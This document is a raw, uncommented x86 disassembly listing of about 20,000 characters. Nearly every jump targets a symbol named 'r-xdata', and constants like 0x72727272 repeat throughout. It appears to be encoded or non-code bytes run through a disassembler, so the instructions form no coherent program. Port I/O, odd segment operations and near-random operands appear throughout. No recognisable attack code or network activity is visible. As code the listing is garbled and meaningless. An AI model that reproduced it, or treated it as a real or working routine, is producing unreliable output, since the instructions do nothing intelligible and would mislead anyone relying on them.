mov ch 0xa
stc
sbb eax 0x72727272
jb r-xdata
jb r-xdata
shr [ ebx ] 0x1
imul edi [ edi + 0x31346916 ] 0x16a71d18
and cl [ ebx ]
test [ ebx - 0x59 ] ch
push cs
mov cl 0x3e
loop r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
shl [ edx ] 0x1
jb r-xdata
jb r-xdata
sbb eax 0xc166ed72
sbb eax 0xb1727272
or edx [ esp + eax + 0x1d ]
jb r-xdata
sbb eax 0x9f6b841d
jb r-xdata
and cl [ ebx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
mov [ 0x1d1c750b ] al
sbb eax 0x84727272
test [ ebx - 0x59 ] ch
xor al 0x84
imul ebp [ edi - 0x457877ea ] 0xffffff88
mov es [ ebx + ebp * 2 - 0x7745eb59 ]
test [ ebx + ebp * 2 - 0x7745e559 ] al
imul ecx [ esi ] 0xe0620e63
loop r-xdata
cwd
das
sbb eax 0x9961841d
movsb [ edi ] [ esi ]
loop r-xdata
and ch ch
mov bh 0x69
push cs
int3
or al [ ecx - 0x44e2e2f8 ]
and ch ch
sbb eax 0x6b84721d
mov bh 0xc
mov [ edi + 0x6b843369 ] cl
or esp [ edi ]
jb r-xdata
and ch ch
jb r-xdata
outsd
cmpsd [ esi ] [ edi ]
push cs
mov dl 0xb5
or ebx [ ecx - 0x1b ]
loop r-xdata
cmp edi [ eax + 0x1d30e90b ]
jb r-xdata
sbb eax 0x84b97272
imul edi [ edi - 0x77c7965c ] 0xffffff81
test [ ebx - 0x41 ] ch
stosb [ edi ]
mov ecx 0xa8bf6b84
imul edi [ edx ] 0x1d21a70b
sbb eax 0xaa76b84
or ebp [ ecx + 0x59 ]
sbb eax 0xb2941d1d
mov eax 0x1d30e90b
jb r-xdata
sbb eax 0x3ce40a1d
jb r-xdata
jb r-xdata
sub dl ah
jb r-xdata
jb r-xdata
jb r-xdata
or ebp ebp
loop r-xdata
push cs
mov bl 0x61
xchg [ esi ] ebx
and cl [ ebx ]
and [ edx ] ecx
sbb eax 0x9a0bb71d
enter 0xe2c4 0xe2
pop ss
sbb eax 0x32be0b1d
sbb eax 0xd122d11d
imul esp [ edi + 0x72212b1e ] 0x72727272
jb r-xdata
add ch [ edi - 0x51 ]
push 0xffffffa7
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edx [ edx ] 0x976b84
jb r-xdata
jb r-xdata
jb r-xdata
popad
and ebp edx
push 0xffffffb6
jmp [ esi ]
push ss
or esp edx
shl edx 0xe2
jb r-xdata
sbb [ 0x236116a7 ] bl
mov edx 0x6b848b88
cmpsd [ esi ] [ edi ]
or al 0xba
mov [ esi + 0xea76b84 ] dl
jb r-xdata
sbb eax 0x1bc0b1d
fidiv [ ebp + 0x33870ab2 ]
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
add al 0x1d
jb r-xdata
sbb eax 0x3c9f6b84
jb r-xdata
jb r-xdata
mov ch 0x88
jb r-xdata
jb r-xdata
fucomi st0
jb r-xdata
jb r-xdata
test cl bl
sub eax 0x1d0a8c0b
sbb eax 0x72727272
sbb eax 0xe855ed1d
jpe r-xdata
jb r-xdata
loop r-xdata
mov cl 0xb4
mov [ esi + 0x1d56960b ] ah
sbb eax 0xc69edb72
shr ch cl
in ax dx
pop ss
jb r-xdata
push ebx
sbb eax 0x7272721d
jb r-xdata
imul esi [ edi - 0x58947bd4 ] 0x34
test [ ebx - 0x51 ] ch
push ss
mov [ edi - 0x7b717746 ] al
imul esp [ edi - 0x7b7745ec ] 0xffffff84
imul esp [ edi - 0x337745e6 ] 0xffffff84
imul esp [ edi - 0x35f445e8 ] 0x1d
sbb eax 0xa76b841d
xor cl [ ebx ]
pop ds
test [ ebx - 0x41 ] ch
movsb [ edi ] [ esi ]
imul edi [ eax ] 0x6b848188
mov edi 0x6b84b9aa
mov edi 0xb3a69a8
or ebp ecx
jb r-xdata
jb r-xdata
or ah ah
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
add ecx [ edi ]
sbb eax 0x6b72721d
cmpsd [ esi ] [ edi ]
push cs
shl [ edx ] 0x1
imul esp [ edi + 0x691dd116 ] 0xffffff96
pop edi
push es
and cl [ bp + di ]
jb r-xdata
mov esp 0xb50b3c69
in al 0xe2
loop r-xdata
0x6b841269 0x97
jb r-xdata
imul esp [ edi + 0x1eaf691e ] 0x69
sahf
outsd
or cl [ ebx ]
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
mov [ 0x6b12971d ] bl
jb r-xdata
outsd
jb r-xdata
jb r-xdata
mov [ ebx + 0x1d1da40b ] al
sbb eax 0x72727272
jb r-xdata
sbb eax 0x23617272
jb r-xdata
test [ ebx - 0x69 ] ch
jb r-xdata
mov edx 0x12699a88
jb r-xdata
jb r-xdata
xor al 0x1d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
lahf
jb r-xdata
jb r-xdata
imul ebx [ edi - 0x564f4c4 ] 0xffffffe2
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
xchg ecx eax
jb r-xdata
jb r-xdata
push cs
jpe r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
imul esp [ esi + 0x1d2f100a ] 0x1d
popad
mov [ es : 0x1d33420b ] al
sbb eax 0x72727272
jb r-xdata
loop r-xdata
xor [ 0xffffffffb972721d ] bl
push ds
test [ ebx - 0x59 ] ch
sbb eax 0x1a0ba21d
jmp r-xdata
aaa
sbb al 0x8a
out 0xe3 al
loop r-xdata
imul esp [ edi - 0x7bdd2ee2 ] 0x6b
cmpsd [ esi ] [ edi ]
cmp al 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
adc al [ ebx + ebp * 2 + 0x69bc0097 ]
jb r-xdata
push ds
jb r-xdata
push es
scasd [ edi ]
scasd [ edi ]
and eax 0xb4a906a7
jb r-xdata
jb r-xdata
pop ds
jb r-xdata
and eax 0xb4a906a7
jb r-xdata
in al dx
and eax 0x87902aa7
mov ah 0xaf
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ ecx + ebp * 2 - 0x1b4af4c4 ] bh
xchg edi eax
jb r-xdata
mov dl 0xed
jb r-xdata
jb r-xdata
xchg [ ebx ] esi
jb r-xdata
or ebx [ ebx + 0x72e2e2fa ]
jb r-xdata
jb r-xdata
jb r-xdata
or bl bl
stc
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp bh [ edx + 0x32698f88 ]
mov [ ebx + 0x6b842369 ] al
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
arpl [ esi ] cx
lea eax [ ebx + ebp * 2 - 0x7745c359 ]
jb r-xdata
jb r-xdata
sbb bl [ 0xffffffffed22671d ]
out 0xe2 ax
loop r-xdata
xor dh [ edx - 0x4d995891 ]
or ecx [ edx + 0x15 ]
popad
sbb eax 0xeab41d1d
in eax dx
push ebp
mov eax [ 0x226784ce ]
in eax dx
sbb eax 0x11878a1d
mov ch 0x15
mov ch 0x6b
movsb [ edi ] [ esi ]
cmpsb [ esi ] [ edi ]
or dl [ eax ]
das
sbb eax 0xa226611d
or eax [ edx + 0x33 ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
add bh [ edx + 0x12699a88 ]
jb r-xdata
jb r-xdata
test eax 0xba9afb4
inc ebp
jmp edx
jb r-xdata
and eax 0x83952ea7
and eax 0xafb426a7
mov ch 0xe4
imul edx [ edi + 0x3c69bc00 ] 0xb
jb r-xdata
scasd [ edi ]
push ds
imul ebx [ esi + 0x4f0b0a6f ] 0x721d1d34
mov eax 0xe2c1e20b
loop r-xdata
push es
jb r-xdata
jb r-xdata
sbb eax 0x1d3ce40a
cmpsd [ esi ] [ edi ]
jb r-xdata
xor ch al
loop r-xdata
jb r-xdata
jb r-xdata
mul dl
loop r-xdata
jb r-xdata
and esi esi
imul ebp [ edi + 0x18af0b1e ] 0x1d
sbb eax 0x72727272
in eax dx
jb r-xdata
imul esp [ edi + 0xb2c694c ] 0xffffff8b
hlt
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esi [ ecx + esi ] 0x16a71d18
jb r-xdata
jb r-xdata
jb r-xdata
cli
jb r-xdata
mov cl 0x1d
mov ch 0xb2
and cl [ bp + di ]
loopne r-xdata
jb r-xdata
imul ebx [ edx ] 0xe2c4950b
fwait
jb r-xdata
mov ah 0xaa
or ebx ebx
imul esp [ ebx ] 0x3aa76b84
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1d2e170b
sbb eax 0x72727272
0x691d1d05 0xb35
test cl bl
adc ebp ebp
mov cl 0xb4
mov ch 0xb
loope r-xdata
mov [ ebx + ebp * 2 - 0x7745fd59 ] es
test [ edx - 0x1d ] bl
loop r-xdata
jb r-xdata
jb r-xdata
adc dl cl
xor [ ebx ] cl
jecxz r-xdata
shr [ ebx ] 0x1
test [ ebx - 0x16 ] ch
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
jb r-xdata
mov [ edx + 0x6b841269 ] bl
jb r-xdata
jb r-xdata
mov [ 0x1d00bf0b ] al
sbb eax 0x72727272
jb r-xdata
jb r-xdata
dec edi
test eax 0xe2ff450b
loop r-xdata
mov ah 0xaf
jb r-xdata
xchg ebp eax
and [ 0xffffffff87902aa7 ] 0xffffffb4
scasd [ edi ]
cmpsd [ esi ] [ edi ]
mov ah 0xaf
in eax dx
jb r-xdata
or eax [ esi - 0x39 ]
loop r-xdata
jb r-xdata
in eax dx
imul esi [ ebx ] 0x38b76b84
jb r-xdata
fdivr [ edx + 0x1d398d0b ]
popad
and ah al
in eax dx
push ebp
shl [ ecx + 0x23 ] cl
loopne r-xdata
sbb [ 0x55edb51d ] ebx
not [ ebx + 0x1d393a0b ]
sbb eax 0x72727272
jb r-xdata
loop r-xdata
imul ecx [ esi ] 0x1a69b5b3
or ebp [ ecx + 0x6be2e2f1 ]
xor [ ebx - 0x59 ] ch
imul esp [ edi - 0x7bda96c4 ] 0x6b
cmpsd [ esi ] [ edi ]
or cl ah
cmc
loop r-xdata
popad
jb r-xdata
cmp al 0xb
in eax dx
0x26ffb66a 0x1b61
xor [ eax ] ebx
sbb eax 0x236116a7
jb r-xdata
jb r-xdata
or edi [ ecx + eax - 0x128de2e3 ]
jb r-xdata
loop r-xdata
jb r-xdata
imul ecx [ esi ] 0x631a0661
push cs
push ds
loop r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
push es
jb r-xdata
jb r-xdata
sbb eax 0xe637272
inc eax
imul ebp [ edi + 0x6a76906 ] 0x23
sbb bh ch
dec edx
jecxz r-xdata
retn 0x1d11
imul esp [ edi - 0x737745c4 ] 0xffffff84
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
in eax dx
jb r-xdata
jb r-xdata
or esp ebx
xor al 0x1d
sbb eax 0xed727272
fisubr [ es : edi - 0x59 ]
retn 0x60ed
push ebp
in eax 0xb
in eax dx
cmpsd [ esi ] [ edi ]
push ds
sbb eax 0x362b0b1d
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
adc dh [ ecx + 0x2f930ab2 ]
imul edi [ ebx + ecx ] 0xe2e2e4b5
jb r-xdata
or edi [ edi + 0x721d1d00 ]
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loope r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
push cs
imul esp [ edi + 0x12a76b16 ] 0x1d1dd90b
sbb eax 0x72727272
cmpsd [ esi ] [ edi ]
or ch [ ecx - 0x59 ]
sbb ch [ ebx - 0x59 ]
adc al 0xed
cmp [ bp + si ] cl
sbb eax 0xbc22d11d
or esi esp
jb r-xdata
jb r-xdata
sbb eax 0xf655edb5
xchg ebx eax
or edi [ edx ]
cmp [ 0x7272721d ] ebx
imul ebx [ ebx - 0x1239396a ] 0x1d318467
sbb eax 0xe2f5cc0a
loop r-xdata
loop r-xdata
fidiv [ ebx - 0x9d99ee3 ]
mov dl [ esi ]
jecxz r-xdata
sbb eax 0x72727272
jb r-xdata
loop r-xdata
or eax [ ebx + 0x721d1d31 ]
jb r-xdata
imul [ ebx - 0x51 ]
push ds
or ebp [ edi + 0x721d1d18 ]
jb r-xdata
mov bh 0x69
push cs
mov bl 0xb5
imul ebx [ edx ] 0xe2f1a90b
loop r-xdata
sbb [ 0xffffffff8a72721d ] ebx
loop r-xdata
sbb [ 0x550bb21d ] ebx
loop r-xdata
xchg esi eax
jb r-xdata
add [ 0x66ed721d ] ebx
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sahf
out 0xe2 al
loop r-xdata
sbb eax 0x6372721d
mov dl 0xe0
loop r-xdata
push cs
jb r-xdata
jb r-xdata
xchg [ esi ] eax
mov cl 0x84
pop edx
jecxz r-xdata
push 0x34
sbb eax 0xe46e0b1d
loop r-xdata
cmp al 0xba
jb r-xdata
sbb eax 0x72727272
test [ ebx - 0x61 ] ch
or [ ebp + 0x1d5e130b ] bh
or ch [ edi + 0x19 ]
sbb eax 0xe40ba21d
xor [ 0x2055ed1d ] bl
outsd
mov edx 0xe72289e0
mov [ ecx ] edi
out 0x24 eax
out 0xd1 al
mov ch [ ecx - 0x41 ]
push ds
imul edi ecx 0xbe6b33e1
shr cl cl
test cl bl
jb r-xdata
sbb eax 0x30d122d1
jb r-xdata
and [ bx + di ] ebx
sbb eax 0x550bb21d
jb r-xdata
adc [ eax - 0x1312f479 ] 0xffffffe2
xchg ebp eax
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
or edi edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov eax 0x300bd388
mov bh 0x38
jb r-xdata
loop r-xdata
jb r-xdata
sbb cl dl
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor [ ecx ] 0x1d
sbb eax 0x72727272
sbb eax 0x72727272
sbb eax 0x961deab5
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov edi 0x721d1d33
jb r-xdata
jb r-xdata
sbb [ 0x7272721d ] bl
mov bh 0x16
imul esp [ edi + 0xaa76b1e ] 0x6b1aa769
mov cl 0xb
aam 0x37
sbb eax 0x7272721d
jb r-xdata
imul esp [ edi - 0x747745f2 ] 0xffffff84
imul esp [ edi - 0x7b7745f4 ] 0xffffff84
imul esp [ edi - 0x747745ee ] 0xb
pop edi
xor ebx [ 0x7272721d ]
jb r-xdata
push 0x1269b4f3
jb r-xdata
jb r-xdata
mov edx 0x32698f88
jb r-xdata
loopne r-xdata
jb r-xdata
jb r-xdata
out dx al
outsd
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
mov [ esp + eax * 4 - 0x45fd5895 ] cl
jb r-xdata
sbb eax 0x64ed721d
jb r-xdata
jb r-xdata
and dl cl
jb r-xdata
sub esp [ ecx ]
jb r-xdata
outsd
nop
xchg [ ebx ] ecx
jb r-xdata
scasd [ edi ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
shl [ edx ] 0x1
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
imul esp [ edi - 0x77dd2ee8 ] 0xffffff9a
cli
jb r-xdata
jb r-xdata
outsd
mov dl 0xed
loop r-xdata
loop r-xdata
jb r-xdata
and cl [ eax - 0x4a2f466 ]
jb r-xdata
jb r-xdata
jb r-xdata
xor eax [ ebx + ebp * 2 - 0x7747c749 ]
ror [ ebx ] cl
jb r-xdata
jb r-xdata
sbb ch [ esi ]
adc cl [ ebx ]
fstp [ 0x72721d1d ]
jb r-xdata
mov bl [ edx ]
and eax 0x2a76b84
mov ch 0xea
sbb eax 0x1deac696
mov ch 0xce
or ebp [ esi ]
sub ebx [ 0x7272721d ]
jb r-xdata
mov dl ah
jb r-xdata
jb r-xdata
lodsb [ esi ]
inc si
mov ah 0xd9
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
imul esp [ edi + 0x1aa7690a ] 0x6b
test [ ecx - 0x24 ] ah
loop r-xdata
adc ch [ edx - 0x59 ]
push 0xffffffa7
jb r-xdata
or eax [ esi + 0x72e2e2ce ]
jb r-xdata
loopne r-xdata
jb r-xdata
jb r-xdata
jpe r-xdata
loop r-xdata
jb r-xdata
imul esp [ esi + 0x530bfec6 ] 0x19
jb r-xdata
sbb eax 0x17c50b1d
sbb eax 0x2a61721d
adc al 0x5
sbb eax 0xed22671d
sub dl [ edx + 0x25c28e90 ]
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0x12
shl [ eax ] 0x1
and bh [ ebp + 0x212bb9bc ]
jb r-xdata
jb r-xdata
jb r-xdata
call 0x69fa5fd8
sbb cl [ edx ]
jb r-xdata
cmp [ 0xffffffffec66ed1d ] bl
mov al [ 0x1a69b4a0 ]
or ch [ ecx + 0x1 ]
sbb eax 0xf226611d
imul edi [ edx ] 0x3d0b1d67
and eax 0xa9af0ea7
mov ah 0xaf
and eax 0x8baf36a7
adc [ eax - 0x1d05f4f5 ] 0x727272e2
jb r-xdata
sbb eax 0xe2ec66ed
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov ah dl
jb r-xdata
mov bh 0x1e
jb r-xdata
0xe2fb5d0b 0x72e2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor cl ah
loop r-xdata
imul esi [ edi - 0x2c7747c8 ] 0xb
jb r-xdata
jb r-xdata
mov ecx 0x7272212b
jb r-xdata
adc al 0x1d
jb r-xdata
imul ebp [ edi - 0x58947bbc ] 0x4c
jb r-xdata
imul esp [ esi + edi - 0x1e ] 0xffffffe2
jb r-xdata
jb r-xdata
sbb ebp ebp
jb r-xdata
imul ebx [ edi ] 0x1d
jb r-xdata
into
jb r-xdata
loop r-xdata
xchg dh cl
jb r-xdata
xor cl [ ebx ]
jb r-xdata
mov [ ecx + 0x698388bb ] dl
jb r-xdata
jb r-xdata
xchg edx eax
jb r-xdata
nop
jb r-xdata
add bh [ edx - 0x3df47878 ]
pop edx
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
fst [ ecx ]
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
push cs
scasd [ edi ]
test eax 0xa725afb4
scasd [ edi ]
mov eax [ ecx - 0x5f4f470 ]
in al dx
jb r-xdata
mov [ edx - 0x1d04a2f5 ] bl
loop r-xdata
jb r-xdata
mov eax ebp
pop ebp
in al dx
jb r-xdata
jb r-xdata
sbb eax 0xec66ed1d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
outsd
jb r-xdata
pushad
fistp [ ebx + 0x56a76a1d ]
jb r-xdata
jb r-xdata
sar [ ecx ] 0x1
jb r-xdata
jb r-xdata
cmp [ eax + 0x300bd388 ] bh
jb r-xdata
push ebp
loop r-xdata
jb r-xdata
imul esp [ esi - 0x7745213a ] 0xffffff87
imul ebp [ ebx + ecx ] 0xe2e2f48b
jb r-xdata
inc esp
loop r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov ebx 0x23698388
jb r-xdata
sbb eax 0xb41d721d
or edx [ ebx + 0x19 ]
jb r-xdata
mov es dx
jb r-xdata
retn 0xa725
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
adc [ 0x7272721d ] ebx
mov edx 0xc20b8788
jb r-xdata
push ebp
jb r-xdata
pop ebp
mov eax 0x84e2e295
fldcw [ 0x1d0a8c0b ]
or bl [ 0xffffffffe855ed1d ]
jb r-xdata
imul ebp [ edi + 0x6f9e691e ] 0x344f0b0a
sbb eax 0xed22671d
popfd
call 0xffffffffbde8a1e3
mov ecx 0x7272212b
jb r-xdata
loop r-xdata
jb r-xdata
or ebx [ ebp - 0x5 ]
sub al 0x1d
sbb eax 0xbeabfdb
loop r-xdata
mov cl 0xd1
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
imul ebp [ edx ] 0x18a76b84
mov ebx 0x16af6b84
jb r-xdata
outsb
jb r-xdata
pop ds
jb r-xdata
or eax [ ebx ]
jb r-xdata
adc ch [ ecx + 0x2a ]
mov ah cl
test [ ebx - 0x51 ] ch
adc [ ebx + 0x16af6b84 ] bh
add ebx [ 0xffffffff8872721d ]
jb r-xdata
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
sbb eax 0x72727272
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
dec esp
cmpsd [ esi ] [ edi ]
push ds
mov dl 0xb
or [ ebx + 0x6972721d ] edi
xor al 0xd1
and cl [ eax - 0x48947b6a ]
inc eax
mov eax 0x44af6b84
outsd
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sub [ ecx + 0x23 ] 0xffffff84
jb r-xdata
0xf6c6bedb 0x66ed
sbb [ 0xffffffffb41d721d ] ebx
jb r-xdata
and eax 0x9b8a2ea7
xchg edx eax
xchg [ 0xffffffff949032a7 ] esp
retn 0xac2
jb r-xdata
cmpsd [ esi ] [ edi ]
mov bl [ cs : ebx - 0x58da786e ]
xor dl [ eax + 0xac2c294 ]
iretd
mov dl 0xa
xor [ edx + 0x1d ] dl
sbb eax 0x61f2a769
sbb eax 0x7272721d
jb r-xdata
cmp [ ecx ] 0x1d
in eax dx
xchg [ ebx ] ecx
jb r-xdata
push ebp
jb r-xdata
or esp [ 0x721d1d52 ]
test [ ebx - 0x41 ] ch
sbb [ eax + 0xb386981 ] cl
sub edx [ ecx + 0x1d ]
sbb eax 0x7a64ed72
xor ecx [ ebx ]
pop ebx
pop eax

jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edi [ edi + 0x721d1d33 ]
imul ebp [ edi - 0x7bd596ea ] 0x6b
jb r-xdata
sbb eax 0x2f590a1d
jb r-xdata
sbb eax 0x1d2f590a
sbb eax 0xd880bbb
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
test [ ebx - 0x5a ] ch
or bl [ 0xffffffffbb1d1d06 ]
outsd
and ch ch
cmp [ ecx + ebx * 8 + 0x4666ed19 ] esi
jb r-xdata
jb r-xdata
imul esp [ edi - 0x12dd98e2 ] 0x66
int3
popad
fsubr st2
or ebp [ ebx + 0x1f ]
test [ ecx - 0x67 ] ah
movsb [ edi ] [ esi ]
loop r-xdata
push ebp
mov eax [ 0xffffffffc80bb286 ]
aas
sbb eax 0xf2e25a1d
loop r-xdata
mov dl 0xed
add bl [ 0xffffffff9f61721d ]
sbb eax 0x30b1eb7
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x72727221
jb r-xdata
jb r-xdata
and eax [ ebx + ebp * 2 - 0x7745c559 ]
jb r-xdata
sbb eax 0xeab41d72
jb r-xdata
push cs
sbb eax 0x6372721d
xchg [ edx ] ebx
loop r-xdata
or dh [ eax ]
push edx
sbb eax 0xf2a7691d
popad
sbb eax 0x7272721d
jb r-xdata
out dx al
or esp [ esi + 0x55 ]
xchg esp eax
mov dl 0xb
push esi
mov dl 0x1d
cmpsd [ esi ] [ edi ]
mov dl 0x1d
rcl [ ebx + 0x1d ] 0x1
sbb eax 0x6fee2661
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg esi eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ds
loope r-xdata
add eax [ edx ]
sbb eax 0x9f61721d
and ch ch
cbw
xor ebx [ 0x1de2881d ]
je r-xdata
mov ah 0xa
sbb eax 0xbb1d1d06
push ss
jb r-xdata
sbb eax 0x880bbb1d
or eax 0x72721d1d
jb r-xdata
or bl [ ecx + 0x2f ]
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
pop ecx
das
in eax dx
shl dl cl
loop r-xdata
loop r-xdata
fstp [ ecx ]
jb r-xdata
jmp r-xdata
push ds
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0x707745c6 ] 0x69
jb r-xdata
push ebp
retn 0x94aa
cmpsd [ esi ] [ edi ]
cmp cl [ ebp + 0x25848d91 ]
cmpsd [ esi ] [ edi ]
xchg esi eax
retn 0x94aa
sbb cl [ edx ]
jb r-xdata
jb r-xdata
mov bh 0xb
mov [ 0xffffffffb7e2e2fb ] al
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ah 0x6f
out 0xb al
sub [ 0xffffffff87881d1d ] esp
test [ ebx - 0x59 ] ch
add al 0xba
mov [ ecx + ebp * 2 - 0x50947bd6 ] cl
or bh [ ebx + 0x6b848588 ]
scasd [ edi ]
or [ ebx + 0x6b848b88 ] bh
scasd [ edi ]
push cs
mov ebx 0x6b848c88
scasd [ edi ]
or al 0xbb
test [ ebx - 0x51 ] ch
or eax [ ebp + 0x3 ]
mov bh 0xb
jb r-xdata
sub al [ ebx + ebp * 2 + 0x22d118a7 ]
push 0xffffffa7
push es
or esp [ ecx + 0x38 ]
sbb eax 0x7272721d
jb r-xdata
push esi
scasd [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
mov cl 0xb
pop esp
fsubr st2
loop r-xdata
and eax 0x90922aa7
jb r-xdata
jb r-xdata
pop esi
sbb eax 0x2eb60b1d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
mov edx 0x25b48c87
jb r-xdata
test [ ebx ] ebp
jb r-xdata
jb r-xdata
push ds
mov dl 0x1d
or ecx [ edi - 0x7 ]
loop r-xdata
fldcw [ 0xffffffffe2e467ed ]
cmp ax 0xe2c2
in eax dx
inc ebp
jb r-xdata
jb r-xdata
mov ebx 0x6b849a88
scasd [ edi ]
xor al 0xbb
mov [ ebx + 0x3aaf6b84 ] al
mov ebx 0x6b848588
scasd [ edi ]
sbb eax 0xf66aeeaf
jecxz r-xdata
jb r-xdata
call 0xffffffff88b8b9e0
mov [ edi - 0x24f4cd97 ] cl
jb r-xdata
0xe2e72a0b 0x72e2
in eax dx
mov ch 0xb5
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
cmpsb [ esi ] [ edi ]
jb r-xdata
imul ecx [ esi ] 0x88fe0e61
xchg [ edx + 0x1d063f0b ] bh
sbb eax 0x72727272
jb r-xdata
or esp [ edx - 0x481d1d05 ]
mov ah 0xa
jpe r-xdata
sbb eax 0x8872721d
inc ecx
or eax 0xa76f1d1d
push edx
mov dl 0xb4
outsd
outsd
outsb
pop ds
sbb eax 0x2f370a1d
sbb eax 0x67bbbb1d
and ch ch
imul ecx [ di ] 0x1d
sbb eax 0xb276a76f
and ch ch
loop r-xdata
jb r-xdata
test eax 0xa969b3aa
mov edx 0x1d12e90a
sbb eax 0x19590bbb
vpsrad ymm4 ymm5 xmm2
in eax dx
jmp r-xdata
jb r-xdata
imul esi [ edx ] 0xe2e8db0b
jb r-xdata
sbb eax 0xd2b41db2
outsd
sub bl [ bx ]
sbb eax 0x3e1a0b1d
sbb eax 0x7272721d
shr [ ebx ] 0x1
and ch ch
jpo r-xdata
cwde
push edx
sbb eax 0x676fb11d
dec esi
mov ch 0xb
jb r-xdata
and eax 0xafaf3aa7
mov edx 0x3ea72587
jb r-xdata
cli
jb r-xdata
imul eax [ ecx ] 0x26611d1d
sbb eax 0xa0e8898a
mov al [ 0xa1a69b4 ]
sbb eax 0xe8898a1d
int 0xe1
loop r-xdata
mov al [ edi + 0x5b ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x590bbb1d
sbb [ 0x7272721d ] ebx
loopne r-xdata
jb r-xdata
loop r-xdata
mov [ ebp + 0x3ca76b84 ] cl
jb r-xdata
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
or eax eax
dec ebp
sbb eax 0xa725721d
or dh [ edi + ebp * 4 - 0x58da4b57 ]
push cs
scasd [ edi ]
test eax 0xa725afb4
mov edx 0x25b48c87
out dx eax
xor [ 0x7272721d ] bl
jb r-xdata
cmp ch [ edi + 0x2587baaf ]
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
shl dl cl
loop r-xdata
mov cl [ edi ]
shl ah 0x1
or al 0xb1
imul esp [ edx + ebx - 0x1e ] 0xffffffe2
loop r-xdata
jb r-xdata
test [ ebx ] 0xa31b
pop ebx
jb r-xdata
test [ ebx - 0x61 ] ch
mov [ 0xffffffffaf5b212b ] al
mov eax 0xb4b1e2e2
test bl bl
0x1d1f610b 0x721d
jb r-xdata
xchg esi eax
mov [ bx ] ss
or dl [ eax + 0x22671d1d ]
in eax dx
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x971db21d
or [ ebx - 0x114896e3 ] 0xa
add ebp [ 0x1db21d1d ]
xchg edi eax
dec [ ebx ]
jb r-xdata
in al 0xc
mov cl 0x6b
sbb ah dl
loop r-xdata
xchg esp eax
mov dl 0xb
xchg ebx eax
loop r-xdata
cld
mov [ edi + 0x2ca76b84 ] dl
jb r-xdata
test [ ebx ] 0xe2e2a31b
